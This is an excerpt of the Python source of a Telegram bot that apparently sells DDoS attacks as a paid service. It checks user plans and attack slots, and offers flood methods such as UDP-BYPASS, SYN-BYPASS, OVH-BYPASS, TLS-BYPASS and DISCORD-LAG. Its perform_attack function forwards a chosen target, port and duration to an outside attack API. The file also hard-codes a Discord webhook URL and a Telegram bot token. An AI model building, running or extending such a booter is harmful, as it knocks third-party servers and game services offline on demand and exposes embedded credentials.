...
webhook_url = 'https://discord.com/api/webhooks/1321984750952648807/T04obzp0j6Ib2kOKJYhpLvZPLCAkbnyMbBIzUX6moIz8DokNiK26ngKf1TVjR3klNyt7'
TOKEN = '7728429312:AAG0WOyJP9lsp4mU92XIdpT_RqrO4UUwTrA'
attack_slots = 5
...
def is_user_authorized(user_id):
    ...
    if info['expiry_date'] < datetime.datetime.now():
        ...
        bot.sendMessage(user_id, 'Your plan has expired. Contact @Y2KS0 to renew.')
        return False
    return True
...
def perform_attack(target, port, duration, method, user_id):
    ...
    url = f'http://5.206.224.207/api.php?key=4564654685465&host={target}&port={port}&time={duration}&method={method}'
    response = requests.get(url)
    ...
    payload = {
      'username': 'breachcrasher Webhook',
      'embeds': embeds
    }
...
def handle_message(msg):
    ...
    if not is_user_authorized(user_id):
        bot.sendMessage(chat_id, f'You dont have plan. Contact @Y2KS0 for buying plan.\n\nYour ID: <code>{user_id}</code>', parse_mode='HTML')
        return
...
- /listblacklist - <strong>See all BlackList.</strong>'''
            ...
            message = '<strong>Owner</strong>: @Y2KS0\n<strong>Version</strong>: 2.0'
            bot.sendMessage(chat_id, message, parse_mode='HTML')
            ...
            if not is_user_authorized(user_id):
                bot.sendMessage(chat_id, 'You dont have plan. Contact @Y2KS0 for buying plan.')
                return
            ...
            keyboard = ReplyKeyboardMarkup(
                keyboard=[
                    [KeyboardButton(text='HTTPGET'), KeyboardButton(text='TLS-BYPASS'), KeyboardButton(text='TLS-DETECT')],
                    [KeyboardButton(text='❌ Cancel')],
                ],
                resize_keyboard=True,
                one_time_keyboard=True
            ...
            keyboard = ReplyKeyboardMarkup(
                keyboard=[
    [KeyboardButton(text='UDP-BYPASS'), KeyboardButton(text='UDP-THOR'), KeyboardButton(text='UDP-PPS')],
    [KeyboardButton(text='TCP-BYPASS'), KeyboardButton(text='TCP-CUSTOM'), KeyboardButton(text='SYN-BYPASS')],
    [KeyboardButton(text='FIVEM-DROP'), KeyboardButton(text='UDP-GAME'), KeyboardButton(text='GAME-CRUX')],
    [KeyboardButton(text='OVH-TCP'), KeyboardButton(text='OVH-BYPASS'), KeyboardButton(text='TS3-DROP')],
    [KeyboardButton(text='DISCORD-LAG'), KeyboardButton(text='OVH-UDP')],
                    [KeyboardButton(text='❌ Cancel')],
                ],
                resize_keyboard=True,
                one_time_keyboard=True
        ...
        elif text in ['UDP-BYPASS', 'UDP-THOR', 'UDP-PPS', 'TCP-BYPASS', 'TCP-CUSTOM', 'SYN-BYPASS', 'FIVEM-DROP', 'UDP-GAME', 'GAME-CRUX', 'OVH-TCP', 'OVH-BYPASS', 'TS3-DROP', 'DISCORD-LAG', 'OVH-UDP',]:
          method = text
          ...
          states[chat_id] = user_state
        elif chat_id in states and states[chat_id].method in ['UDP-BYPASS', 'UDP-THOR', 'UDP-PPS', 'TCP-BYPASS', 'TCP-CUSTOM', 'SYN-BYPASS', 'FIVEM-DROP', 'UDP-GAME', 'GAME-CRUX', 'OVH-TCP', 'OVH-BYPASS', 'TS3-DROP', 'DISCORD-LAG', 'OVH-UDP',]:
            ...
            if not user_state.target:
              ...
              user_attack_slots = info.get('attack_slots', 0)
              if concurrents <= 0:
                bot.sendMessage(chat_id, 'Your concurrents count is zero. Contact @Y2KS0 to update your plan.')
                del states[chat_id]  
                return
        ...
        elif text == 'HTTPGET' or text == 'TLS-BYPASS' or text == 'TLS-DETECT':
            ...
            user_state = UserState(method=method)
            states[chat_id] = user_state
        elif chat_id in states and states[chat_id].method in ['HTTPGET', 'TLS-BYPASS', 'TLS-DETECT']:
...
if __name__ == '__main__':
    ...
    admin_users = set()
    admin_ids = [5645819302, 456]  # admin user id here
